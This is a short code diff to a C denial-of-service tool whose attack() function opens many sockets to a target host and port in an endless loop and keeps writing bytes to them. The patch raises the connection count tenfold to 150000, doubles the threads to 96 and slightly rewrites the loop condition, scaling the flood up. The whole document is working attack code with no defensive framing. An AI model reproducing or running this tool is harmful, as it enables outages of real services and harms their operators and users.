@@ -46,8 +46,8 @@ void broke(int s) {
 	// do nothing
 }
 
-#define CONNECTIONS 15000
-#define THREADS 48
+#define CONNECTIONS 150000
+#define THREADS 96
 
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
@@ -56,7 +56,7 @@ void attack(char *host, char *port, int id) {
 		sockets[x]=0;
 	signal(SIGPIPE, &broke);
 	while(1) {
-		for(x=0; x < CONNECTIONS; x++) {
+		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 			r=write(sockets[x], "\0", 1);
